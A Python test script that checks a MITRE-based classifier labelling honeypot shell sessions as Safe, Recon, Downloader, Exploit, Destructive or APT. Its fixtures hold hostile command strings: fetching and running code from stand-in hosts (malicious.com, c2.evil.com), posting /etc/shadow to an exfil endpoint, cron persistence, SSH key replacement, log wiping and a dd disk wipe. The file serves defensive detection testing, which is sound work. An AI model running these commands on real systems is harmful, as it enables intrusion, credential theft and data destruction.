#!/usr/bin/env python3
"""
Test script to verify MITRE-only semantic balanced labels for test cases.
"""

import sys
from pathlib import Path

# Add src to path
sys.path.insert(0, str(Path(__file__).parent / "src"))

from training.neural.semantic_labels import compute_mitre_only_semantic_balanced_label

# Demo test cases from src/demo.py
DEMO_SESSIONS = [
    {
        "name": "Benign User Session",
        "commands": "ls -la; pwd; whoami; cat README.md",
        "expected": "Safe"
    },
    {
        "name": "Network Reconnaissance",
        "commands": "nmap -sS 192.168.1.0/24; netstat -tulpn; cat /etc/hosts; ps aux | grep ssh",
        "expected": "Recon"
    },
    {
        "name": "Malware Download & Execute",
        "commands": "cd /tmp; wget http://malicious.com/bot.sh; chmod +x bot.sh; ./bot.sh",
        "expected": "Downloader"
    },
    {
        "name": "Credential Theft Attempt",
        "commands": "cat /etc/shadow; cat /etc/passwd; find / -name '*.pem' 2>/dev/null",
        "expected": "Exploit"
    },
    {
        "name": "Destructive Attack",
        "commands": "rm -rf /var/log/*; history -c; dd if=/dev/zero of=/dev/sda bs=1M",
        "expected": "Destructive"
    },
    {
        "name": "APT Multi-Stage Attack",
        "commands": "wget http://c2.evil.com/implant; chmod +x implant; ./implant; "
                   "cat /etc/shadow > /tmp/creds; curl -X POST http://c2.evil.com/exfil -d @/tmp/creds; "
                   "echo '* * * * * /tmp/implant' >> /var/spool/cron/root; "
                   "chattr +i /tmp/implant",
        "expected": "ADVANCED_APT"
    },
    {
        "name": "Real Honeypot Session (SSH Key Replacement)",
        "commands": "cd ~; chattr -ia .ssh; lockr -ia .ssh; rm -rf .ssh; mkdir .ssh; "
                   "echo 'ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArD...' > .ssh/authorized_keys; "
                   "chmod 600 .ssh/authorized_keys; chattr +ia .ssh",
        "expected": "Destructive"
    }
]

CLASS_NAMES = ['Safe', 'Recon', 'Downloader', 'Exploit', 'Destructive', 'ADVANCED_APT']

print("\n" + "="*100)
print(" TESTING MITRE-ONLY SEMANTIC BALANCED LABEL FUNCTION")
print("="*100 + "\n")

correct = 0
total = len(DEMO_SESSIONS)

for i, session in enumerate(DEMO_SESSIONS, 1):
    label_id, label_name, scores = compute_mitre_only_semantic_balanced_label(session["commands"])
    predicted = CLASS_NAMES[label_id]
    expected = session["expected"]
    
    match = "✓ MATCH" if predicted == expected else "✗ MISMATCH"
    if predicted == expected:
        correct += 1
    
    print(f"Test {i}: {session['name']}")
    print(f"  Commands: {session['commands'][:80]}...")
    print(f"  Expected: {expected}")
    print(f"  Predicted: {predicted}")
    print(f"  Scores: {scores}")
    print(f"  {match}\n")

print("="*100)
print(f" SUMMARY: {correct}/{total} correct ({100*correct/total:.1f}%)")
print("="*100 + "\n")
